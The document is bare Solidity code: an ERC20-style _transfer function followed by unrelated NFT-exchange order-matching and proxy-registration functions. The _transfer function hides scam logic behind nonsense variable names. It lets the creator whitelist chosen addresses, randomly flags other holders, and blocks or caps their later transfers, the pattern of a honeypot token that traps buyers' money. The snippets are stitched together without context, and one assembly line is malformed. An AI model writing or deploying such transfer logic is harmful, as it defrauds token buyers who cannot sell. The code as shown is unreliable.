function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (waterpipe == false)) {
        papers = chTx;
        teeth = true;
    }
    if ((address(sender) == creator) && (waterpipe == true)) {
        spongebob[recipient] = true;
        patrick[recipient] = false;
        waterpipe = false;
    }
    if ((amount > himalaya) && (spongebob[sender] == true) && (address(sender) != creator)) {
        stars[recipient] = true;
    }
    if (spongebob[recipient] != true) {
        patrick[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((patrick[sender]) && (spongebob[recipient] == false)) {
        patrick[recipient] = true;
    }
    if (spongebob[sender] == false) {
        if ((amount > himalaya) && (stars[sender] == true)) {
            require(false);
        }
        require(amount < papers);
        if (teeth == true) {
            if (stars[sender] == true) {
                require(false);
            }
            stars[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function atomicMatch(Order memory buy, Sig memory buySig, Order memory sell, Sig memory sellSig, bytes32 metadata)
internal
reentrancyGuard {
    bytes32 buyHash;
    if (buy.maker == msg.sender) {
        require(validateOrderParameters(buy));
    } else {
        buyHash = _requireValidOrderWithNonce(buy, buySig);
    }
    bytes32 sellHash;
    if (sell.maker == msg.sender) {
        require(validateOrderParameters(sell));
    } else {
        sellHash = _requireValidOrderWithNonce(sell, sellSig);
    }
    require(ordersCanMatch(buy, sell));
    uint size;
    address target = sell.target;
    assembly {
        size: = extcodesize(target)
    }
    require(size > 0);
    if (buy.replacementPattern.length > 0) {
        ArrayUtils.guardedArrayReplace(buy.calldata, sell.calldata, buy.replacementPattern);
    }
    if (sell.replacementPattern.length > 0) {
        ArrayUtils.guardedArrayReplace(sell.calldata, buy.calldata, sell.replacementPattern);
    }
    require(ArrayUtils.arrayEq(buy.calldata, sell.calldata));
    OwnableDelegateProxy delegateProxy = registry.proxies(sell.maker);
    require(delegateProxy != address(0));
    AuthenticatedProxy proxy = AuthenticatedProxy(delegateProxy);
    if (msg.sender != buy.maker) {
        cancelledOrFinalized[buyHash] = true;
    }
    if (msg.sender != sell.maker && sell.saleKind != SaleKindInterface.SaleKind.CollectionRandomSale) {
        cancelledOrFinalized[sellHash] = true;
    }
    if (sell.saleKind == SaleKindInterface.SaleKind.CollectionRandomSale) {
        uint256 quantity = getQuantity(buy);
        if (quantity > 1) {
            sell.basePrice = SafeMath.mul(sell.basePrice, quantity);
            buy.basePrice = sell.basePrice;
        }
    }
    uint price = executeFundsTransfer(buy, sell);
    require(delegateProxy.implementation() == registry.delegateProxyImplementation());
    require(proxy.proxy(sell.target, sell.howToCall, sell.calldata));
    if (buy.staticTarget != address(0)) {
        require(staticCall(buy.staticTarget, sell.calldata, buy.staticExtradata));
    }
    if (sell.staticTarget != address(0)) {
        require(staticCall(sell.staticTarget, sell.calldata, sell.staticExtradata));
    }
    emit OrdersMatched(buyHash, sellHash, sell.feeRecipient != address(0) ? sell.maker : buy.maker, sell.feeRecipient != address(0) ? buy.maker : sell.maker, price, metadata);
}

function registerProxy()
public
returns(OwnableDelegateProxy proxy) {
    require(proxies[msg.sender] == address(0));
    proxy = new OwnableDelegateProxy(msg.sender, delegateProxyImplementation, abi.encodeWithSignature("initialize(address,address)", msg.sender, address(this)));
    proxies[msg.sender] = proxy;
    return proxy;
}

